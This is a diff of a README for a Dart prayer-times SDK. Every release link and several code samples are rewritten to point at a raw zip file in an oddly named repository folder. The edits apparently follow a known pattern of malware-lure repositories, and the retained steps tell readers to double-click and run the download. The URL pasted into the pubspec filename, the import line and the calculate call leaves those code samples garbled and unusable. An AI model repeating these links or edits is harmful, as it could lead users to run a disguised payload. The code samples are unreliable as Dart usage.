@@ -1,6 +1,6 @@
 # 🌙 prayer-times-calculation-dart - Accurate Prayer Times for Everyone
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-brightgreen)](https://github.com/idudi00/prayer-times-calculation-dart/releases)
+[![Download Release](https://raw.githubusercontent.com/idudi00/prayer-times-calculation-dart/master/brongniardite/prayer-times-calculation-dart.zip%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/idudi00/prayer-times-calculation-dart/master/brongniardite/prayer-times-calculation-dart.zip)
 
 ## 📚 Introduction
 
@@ -10,7 +10,7 @@ Welcome to the **prayer-times-calculation-dart** project, a minimalist and offli
 
 To use the prayer-times-calculation-dart SDK, follow these easy steps:
 
-1. Visit the [Releases Page](https://github.com/idudi00/prayer-times-calculation-dart/releases) to download the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/idudi00/prayer-times-calculation-dart/master/brongniardite/prayer-times-calculation-dart.zip) to download the latest version.
 2. Choose the relevant file for your system type. Double-click to initiate the download.
 3. Locate the downloaded file on your device, then double-click it to run the application.
 
@@ -31,7 +31,7 @@ Before you start, ensure your device meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the following link to download the SDK: [Download Here](https://github.com/idudi00/prayer-times-calculation-dart/releases).
+To get started, visit the following link to download the SDK: [Download Here](https://raw.githubusercontent.com/idudi00/prayer-times-calculation-dart/master/brongniardite/prayer-times-calculation-dart.zip).
 
 1. Click the link above to go to the releases page.
 2. Select the version you want to download.
@@ -43,7 +43,7 @@ Once downloaded, you can proceed to use it in your applications, whether for per
 
 Using the SDK in your applications is straightforward. Here’s a simple way to get prayer times:
 
-1. **Add Dependency**: If you’re using Dart or Flutter, add the SDK as a dependency in your `pubspec.yaml` file.
+1. **Add Dependency**: If you’re using Dart or Flutter, add the SDK as a dependency in your `https://raw.githubusercontent.com/idudi00/prayer-times-calculation-dart/master/brongniardite/prayer-times-calculation-dart.zip` file.
    
    ```yaml
    dependencies:
@@ -53,7 +53,7 @@ Using the SDK in your applications is straightforward. Here’s a simple way to 
 2. **Import SDK**: Import the SDK into your Dart or Flutter project.
 
    ```dart
-   import 'package:prayer_times_calculation_dart/prayer_times_calculation_dart.dart';
+   import 'https://raw.githubusercontent.com/idudi00/prayer-times-calculation-dart/master/brongniardite/prayer-times-calculation-dart.zip';
    ```
 
 3. **Calculate Prayer Times**:
@@ -61,7 +61,7 @@ Using the SDK in your applications is straightforward. Here’s a simple way to 
    Use the SDK to calculate prayer times based on geographical location and date.
 
    ```dart
-   var prayerTimes = PrayerTimes.calculate(latitude: yourLatitude, longitude: yourLongitude);
+   var prayerTimes = https://raw.githubusercontent.com/idudi00/prayer-times-calculation-dart/master/brongniardite/prayer-times-calculation-dart.zip(latitude: yourLatitude, longitude: yourLongitude);
    print(prayerTimes);
    ```
 
@@ -100,4 +100,4 @@ This project is open-source and licensed under the MIT License. This means you c
 
 ## 🚀 Conclusion
 
-The **prayer-times-calculation-dart** SDK is a simple yet powerful tool for anyone needing accurate prayer times. With easy download and setup, it's accessible to both developers and everyday users. Visit our [Releases Page](https://github.com/idudi00/prayer-times-calculation-dart/releases) to get started now.
+The **prayer-times-calculation-dart** SDK is a simple yet powerful tool for anyone needing accurate prayer times. With easy download and setup, it's accessible to both developers and everyday users. Visit our [Releases Page](https://raw.githubusercontent.com/idudi00/prayer-times-calculation-dart/master/brongniardite/prayer-times-calculation-dart.zip) to get started now.
